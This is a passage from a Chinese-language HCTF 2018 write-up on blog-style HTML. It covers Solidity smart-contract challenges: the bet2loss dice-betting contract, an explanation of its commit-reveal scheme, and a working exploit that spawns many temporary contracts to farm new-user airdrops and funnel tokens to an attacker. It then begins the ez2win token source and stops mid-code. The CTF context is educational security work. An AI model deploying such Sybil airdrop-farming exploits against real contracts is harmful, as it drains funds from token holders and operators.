class="function">event <span class="title">FailedPayment</span><span class="params">(address indexed beneficiary, uint amount)</span></span>;</span><br><span class="line">    <span class="function">event <span class="title">Payment</span><span class="params">(address indexed beneficiary, uint amount)</span></span>;</span><br><span class="line">    <span class="function">event <span class="title">Commit</span><span class="params">(uint commit)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">event <span class="title">GetFlag</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="built_in">string</span> b64email,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="built_in">string</span> back</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line">    constructor () <span class="keyword">public</span> &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        secretSigner = DUMMY_ADDRESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        require (msg.sender == owner, <span class="string">"OnlyOwner methods called by non-owner."</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setSecretSigner</span><span class="params">(address newSecretSigner)</span> external onlyOwner </span>&#123;</span><br><span class="line">        secretSigner = newSecretSigner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">placeBet</span><span class="params">(uint betMask, uint modulo, uint betnumber, uint commitLastBlock, uint commit, bytes32 r, bytes32 s, uint8 v)</span> external payable </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// airdrop</span></span><br><span class="line">        AirdropCheck();</span><br><span class="line"></span><br><span class="line">        Bet storage bet = bets[commit];</span><br><span class="line">        require (bet.gambler == address(<span class="number">0</span>), <span class="string">"Bet should be in a 'clean' state."</span>);</span><br><span class="line">        require (balances[msg.sender] &gt;= betnumber, <span class="string">"no more balances"</span>);</span><br><span class="line">        require (modulo &gt; <span class="number">1</span> &amp;&amp; modulo &lt;= MAX_MODULO, <span class="string">"Modulo should be within range."</span>);</span><br><span class="line">        require (betMask &gt;= <span class="number">0</span> &amp;&amp; betMask &lt; modulo, <span class="string">"Mask should be within range."</span>);</span><br><span class="line">        require (betnumber &gt; <span class="number">0</span> &amp;&amp; betnumber &lt; <span class="number">1000</span>, <span class="string">"BetNumber should be within range."</span>);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        require (block.number &lt;= commitLastBlock, <span class="string">"Commit has expired."</span>);</span><br><span class="line">        bytes32 signatureHash = keccak256(abi.encodePacked(commitLastBlock, commit));</span><br><span class="line">        require (secretSigner == ecrecover(signatureHash, v, r, s), <span class="string">"ECDSA signature is not valid."</span>);</span><br><span class="line"></span><br><span class="line">        uint possibleWinAmount;</span><br><span class="line"></span><br><span class="line">        possibleWinAmount = getDiceWinAmount(betnumber, modulo);</span><br><span class="line">        lockedInBets += uint128(possibleWinAmount);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// require (lockedInBets &lt;= balances[owner], "Cannot afford to lose this bet.");</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = balances[msg.sender].sub(betnumber);</span><br><span class="line">        <span class="function">emit <span class="title">Commit</span><span class="params">(commit)</span></span>;</span><br><span class="line"></span><br><span class="line">        bet.betnumber = betnumber;</span><br><span class="line">        bet.modulo = uint8(modulo);</span><br><span class="line">        bet.placeBlockNumber = uint40(block.number);</span><br><span class="line">        bet.mask = uint40(betMask);</span><br><span class="line">        bet.gambler = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">settleBet</span><span class="params">(uint reveal)</span> external </span>&#123;</span><br><span class="line">        AirdropCheck();</span><br><span class="line"></span><br><span class="line">        uint commit = uint(keccak256(abi.encodePacked(reveal)));</span><br><span class="line"></span><br><span class="line">        Bet storage bet = bets[commit];</span><br><span class="line">        uint placeBlockNumber = bet.placeBlockNumber;</span><br><span class="line"></span><br><span class="line">        require (block.number &gt; placeBlockNumber, <span class="string">"settleBet in the same block as placeBet, or before."</span>);</span><br><span class="line">        require (block.number &lt;= placeBlockNumber + BET_EXPIRATION_BLOCKS, <span class="string">"Blockhash can't be queried by EVM."</span>);</span><br><span class="line"></span><br><span class="line">        settleBetCommon(bet, reveal);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">settleBetCommon</span><span class="params">(Bet storage bet, uint reveal)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">        uint betnumber = bet.betnumber;</span><br><span class="line">        uint mask = bet.mask;</span><br><span class="line">        uint modulo = bet.modulo;</span><br><span class="line">        uint placeBlockNumber = bet.placeBlockNumber;</span><br><span class="line">        address gambler = bet.gambler;</span><br><span class="line"></span><br><span class="line">        require (betnumber != <span class="number">0</span>, <span class="string">"Bet should be in an 'active' state"</span>);</span><br><span class="line"></span><br><span class="line">        bytes32 entropy = keccak256(abi.encodePacked(reveal, placeBlockNumber));</span><br><span class="line">        uint dice = uint(entropy) % modulo;</span><br><span class="line"></span><br><span class="line">        uint diceWinAmount;</span><br><span class="line">        diceWinAmount = getDiceWinAmount(betnumber, modulo);</span><br><span class="line"></span><br><span class="line">        uint diceWin = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dice == mask)&#123;</span><br><span class="line">          diceWin = diceWinAmount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lockedInBets -= uint128(diceWinAmount);</span><br><span class="line"></span><br><span class="line">        sendFunds(gambler, diceWin == <span class="number">0</span> ? <span class="number">1</span> wei : diceWin , diceWin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">getDiceWinAmount</span><span class="params">(uint amount, uint modulo)</span> <span class="keyword">private</span> pure <span class="title">returns</span> <span class="params">(uint winAmount)</span> </span>&#123;</span><br><span class="line">      winAmount = amount * modulo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">sendFunds</span><span class="params">(address beneficiary, uint amount, uint successLogAmount)</span> <span class="keyword">private</span> </span>&#123;</span><br><span class="line">      transfer(beneficiary, amount);</span><br><span class="line">      <span class="function">emit <span class="title">Payment</span><span class="params">(beneficiary, successLogAmount)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//flag</span></span><br><span class="line">    <span class="function">function <span class="title">PayForFlag</span><span class="params">(<span class="built_in">string</span> b64email)</span> <span class="keyword">public</span> payable <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">      require (balances[msg.sender] &gt; <span class="number">10000000</span>);</span><br><span class="line">      <span class="function">emit <span class="title">GetFlag</span><span class="params">(b64email, <span class="string">"Get flag!"</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>空投，自然想到薅羊毛。</p>
<p>这个代码很容易看出是从dice2win改过来的，有的参数都没有删干净。<br>可以参考<a href="http://blogs.360.cn/post/Fairness_Analysis_of_Dice2win.html" target="_blank" rel="noopener"></a>里面的一些介绍。<br>dice2win主要的流程如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.【庄家承诺】庄家(secretSigner)随机生成某随机数reveal，同时计算commit = keccak256 (reveal)对该reveal进行承诺。然后根据目前区块高度，设置一个该承诺使用的最后区块高度commitLastBlock。 对commitLastBlock和commit的组合体进行签名得到sig，同时把(commit, commitLastBlock,sig)发送给玩家。</span><br><span class="line">2. 【玩家下注】玩家获得(commit, commitLastBlock,sig)后选择具体要玩的游戏，猜测一个随机数r，发送下注交易placeBet到智能合约上进行下注。</span><br><span class="line">3. 【矿工打包】下注交易被以太坊矿工打包到区块block1中，并将玩家下注内容存储到合约存储空间中。</span><br><span class="line">4.【庄家开奖】当庄家在区块block1中看到玩家的下注信息后。则发送settleBet交易公开承诺值reveal到区块链上。合约计算随机数random_number=keccak256(reveal,block1.hash)。如果random_number满足用户下注条件，则用户胜，否则庄家胜。此外游戏还设有大奖机制，即如果某次random_number满足某个特殊值(如88888)，则用户可赢得奖金池中的大奖。</span><br></pre></td></tr></table></figure></p>
<p>可以简单地说，调用placeBet下注，调用settleBet开奖。</p>
<p>可以看一下我们可以调用哪些函数，直接把源码复制到remix中，部署一下<br>在右下角，我们可以看到可以调用的函数。<br>PayForFlag函数用来证明自己完成任务，让后台发flag的证明<br>placeBet函数下注<br>settleBet函数结算<br>setSecretSigner函数设置签名者，只有owner可以调用。（如果commit-reveal机制）<br>transfer 函数，直接可以从msg.sender账户中向特定地址转账。</p>
<p>简单可以想到，可以创建一个合约，调用这个合约的函数，创建多个临时合约（这里临时指的是，我们临时用一用，用完就不理它了），然后这些临时合约将钱转给某个特定的地址，那么就可以积少成多，达到题目的要求。</p>
<p>回头看看空投在哪里触发，<code>AirdropCheck()</code>检查该用户是否新用户，如果是，则空投1000 B2GB。<br>在placeBet函数和settleBet函数中都有调用。<br>直接上EXP<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"><span class="comment">// Wow. Welcome to hctf2018</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"browser/bet2loss.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract KongTouBot&#123;</span><br><span class="line">    constructor(address victim, address attack) <span class="keyword">public</span> payable&#123;</span><br><span class="line">       Bet2Loss victimContract = Bet2Loss(victim);</span><br><span class="line">       victimContract.settleBet(<span class="number">47080097</span>);</span><br><span class="line">       victimContract.transfer(attack, <span class="number">900</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">function <span class="title">kill</span><span class="params">()</span> <span class="keyword">public</span></span>&#123;</span><br><span class="line">        selfdestruct(<span class="number">0xdea21565e077aa6b5864446e1624f553dc158603</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bet2LossEXP&#123;</span><br><span class="line">    constructor() <span class="keyword">public</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(var i=<span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">            KongTouBot tmp = <span class="keyword">new</span> KongTouBot(<span class="number">0x006b9bc418e43e92cf8d380c56b8d4be41fda319</span>,msg.sender);</span><br><span class="line">            <span class="comment">//tmp.kill();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//selfdestruct(msg.sender);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">attack</span><span class="params">(uint num)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(var i=<span class="number">0</span>; i &lt; num; i++)&#123;</span><br><span class="line">            KongTouBot tmp = <span class="keyword">new</span> KongTouBot(<span class="number">0x006b9bc418e43e92cf8d380c56b8d4be41fda319</span>,msg.sender);</span><br><span class="line">            <span class="comment">//tmp.kill();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>victimContract.settleBet(47080097);</code>这里需要稍微理解commit-reveal机制，从庄家开奖的交易中找参数，因为这里没有限制只能开奖一次（不过注意，转账是从调用开奖这个函数的人那里转给下注的人）。</p>
<p>然后，疯狂跑就是了，建议用geth接入测试网络，然后web3.js来直接批量操作，不然，如果使用metamask，你会很绝望，要一个一个交易确认。</p>
<h2 id="ez2win"><a href="#ez2win" class="headerlink" title="ez2win"></a>ez2win</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title ERC20 interface</span></span><br><span class="line"><span class="comment"> * @dev see https://github.com/ethereum/EIPs/issues/20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">  <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> external view <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(address who)</span> external view <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">allowance</span><span class="params">(address owner, address spender)</span></span></span><br><span class="line"><span class="function">    external view <span class="title">returns</span> <span class="params">(uint256)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(address to, uint256 value)</span> external <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">approve</span><span class="params">(address spender, uint256 value)</span></span></span><br><span class="line"><span class="function">    external <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transferFrom</span><span class="params">(address from, address to, uint256 value)</span></span></span><br><span class="line"><span class="function">    external <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">event <span class="title">Transfer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    address indexed from,</span></span></span><br><span class="line"><span class="function"><span class="params">    address indexed to,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 value</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">event <span class="title">Approval</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    address indexed owner,</span></span></span><br><span class="line"><span class="function"><span class="params">    address indexed spender,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 value</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">event <span class="title">GetFlag</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="built_in">string</span> b64email,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="built_in">string</span> back</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title SafeMath</span></span><br><span class="line"><span class="comment"> * @dev Math operations with safety checks that revert on error</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Multiplies two numbers, reverts on overflow.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">mul</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Gas optimization: this is cheaper than requiring 'a' not being zero, but the</span></span><br><span class="line">    <span class="comment">// benefit is lost if 'b' is also tested.</span></span><br><span class="line">    <span class="comment">// See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">div</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    require(b &gt; <span class="number">0</span>); <span class="comment">// Solidity only automatically asserts when dividing by 0</span></span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    <span class="comment">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">sub</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Adds two numbers, reverts on overflow.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">add</span><span class="params">(uint256 a, uint256 b)</span> internal pure <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title Standard ERC20 token</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @dev Implementation of the basic standard token.</span></span><br><span class="line"><span class="comment"> * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</span></span><br><span class="line"><span class="comment"> * Originally based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract ERC20 is IERC20 &#123;</span><br><span class="line">  <span class="keyword">using</span> SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint256) <span class="keyword">public</span> _balances;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; mapping (address =&gt; uint256)) <span class="keyword">public</span> _allowed;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; <span class="keyword">bool</span>) initialized;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">public</span> _totalSupply;</span><br><span class="line">  </span><br><span class="line">  uint256 <span class="keyword">public</span> constant _airdropAmount = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Total number of tokens in existence</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Gets the balance of the specified address.</span></span><br><span class="line"><span class="comment">  * @param owner The address to query the balance of.</span></span><br><span class="line"><span class="comment">  * @return An uint256 representing the amount owned by the passed address.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(address owner)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _balances[owner];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// airdrop</span></span><br><span class="line">  <span class="function">function <span class="title">AirdropCheck</span><span class="params">()</span> internal <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (!initialized[msg.sender]) &#123;</span><br><span class="line">            initialized[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">            _balances[msg.sender] = _airdropAmount;</span><br><span class="line">            _totalSupply += _airdropAmount;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Function to check the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * @param owner address The address which owns the funds.</span></span><br><span class="line"><span class="comment">   * @param spender address The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @return A uint256 specifying the amount of tokens still available for the spender.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">function <span class="title">allowance</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    address owner,</span></span></span><br><span class="line"><span class="function"><span class="params">    address spender</span></span></span><br><span class="line"><span class="function"><span class="params">   )</span></span></span><br><span class="line"><span class="function">    <span class="keyword">public</span></span></span><br><span class="line"><span class="function">    view</span></span><br><span class="line"><span class="function">    <span class="title">returns</span> <span class="params">(uint256)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _allowed[owner][spender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Transfer token for a specified address</span></span><br><span class="line"><span class="comment">  * @param to The address to transfer to.</span></span><br><span class="line"><span class="comment">  * @param value The amount to be transferred.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(address to, uint256 value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span> </span>&#123;</span><br><span class="line">    AirdropCheck();</span><br><span class="line">    _transfer(msg.sender, to, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.</span></span><br><span class="line"><span class="comment">   * Beware that changing an allowance with this method brings the risk that someone may use both the old</span></span><br><span class="line"><span class="comment">   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span></span><br><span class="line"><span class="comment">   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:</span></span><br><span class="line"><span class="comment">   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span></span><br><span class="line"><span class="comment">   * @param spender The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @param value The amount of tokens to be spent.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">function <span class="title">approve</span><span class="params">(address spender, uint256 value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span> </span>&#123;</span><br><span class="line">    require(spender != address(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    AirdropCheck();</span><br><span class="line">    _allowed[msg.sender][spender] = value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span 